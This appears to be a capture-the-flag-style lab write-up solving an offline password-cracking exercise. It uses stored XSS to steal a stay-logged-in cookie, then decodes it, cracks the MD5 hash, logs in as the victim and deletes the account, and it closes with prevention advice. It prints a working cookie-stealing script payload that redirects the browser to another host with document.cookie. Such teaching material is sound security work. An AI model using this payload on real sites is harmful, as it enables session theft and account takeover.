# Lab: Offline Password Cracking

## Objective

Obtain Carlos's stay-logged-in cookie using Stored XSS, crack his password offline, then log in as Carlos and delete his account.

---

## Vulnerability

The application is vulnerable to:

- Stored Cross-Site Scripting (Stored XSS)
- Weak Stay-Logged-In Cookie
- Offline Password Cracking

The persistent login cookie stores:

```
Base64(username:MD5(password))
```

An attacker can steal the cookie using XSS, decode it, crack the MD5 hash, and recover the user's password.

---

## Phase 1 - Discover the XSS

Login using:

```
Username: wiener
Password: peter
```

Go to any blog post and submit a malicious comment.

Payload:

```html
<script>
document.location="https://YOUR-LAB-ID.web-security-academy.net/?c="+document.cookie;
</script>
```

Submit the comment.

---

## Phase 2 - Exploit the Victim

Open:

```
Exploit Server
```

Use the same payload.

Deliver the exploit to the victim.

After Carlos visits the page, check:

```
Access Log
```

A request similar to the following appears:

```
GET /exploit/secret=...;
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

The cookie has now been stolen.

---

## Phase 3 - Decode the Cookie

Decode the Base64 value.

Example:

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

↓

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

The second value is an MD5 hash.

---

## Phase 4 - Crack the Password

Use an online hash cracking service such as:

```
CrackStation
```

Recovered password:

```
onceuponatime
```

---

## Phase 5 - Login as Carlos

Login using:

```
Username:
carlos

Password:
onceuponatime
```

Open:

```
My Account
```

Delete Carlos's account.

Lab Solved ✅

---

## Why does this vulnerability exist?

The application stores:

```
username + MD5(password)
```

inside a client-side cookie.

Because the password hash is unsalted and predictable, stealing the cookie allows attackers to recover the original password using offline cracking.

The Stored XSS vulnerability makes stealing the cookie trivial.

---

## Prevention

- Prevent Stored XSS using proper output encoding.
- Mark authentication cookies as HttpOnly.
- Never store password hashes inside cookies.
- Use random server-side session identifiers.
- Use strong password hashing algorithms such as Argon2 or bcrypt.

---

## Tools Used

- Burp Suite
- Exploit Server
- Burp Decoder
- CrackStation

---

## Skills Learned

- Stored XSS
- Cookie Theft
- Base64 Decoding
- MD5 Hash Identification
- Offline Password Cracking
- Session Analysis

---

## Real World Scenario

Attackers often combine XSS with weak authentication mechanisms.

If an application stores password-derived values inside cookies, a single Stored XSS can expose user credentials without interacting with the login page.

---

## Key Takeaway

**Never store password hashes inside client-side cookies. A Stored XSS combined with weak authentication design can lead to complete account compromise.**
